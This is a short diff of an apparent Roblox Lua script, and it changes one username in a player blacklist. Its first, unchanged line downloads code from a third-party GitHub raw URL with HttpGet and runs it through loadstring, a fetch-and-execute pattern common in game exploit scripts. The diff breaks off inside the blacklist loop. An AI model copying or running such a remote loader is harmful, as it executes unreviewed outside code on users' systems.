@@ -1,5 +1,5 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/ily123950/scv3loader/main/nothing'))()
-local blacklist = {"sasabuslox"} -- List of blacklisted players
+local blacklist = {"TR4PPZAYZ"} -- List of blacklisted players
 local antiVgEnabled = true
 game.Players.PlayerAdded:Connect(function(player)
     for _, blacklistedPlayer in ipairs(blacklist) do
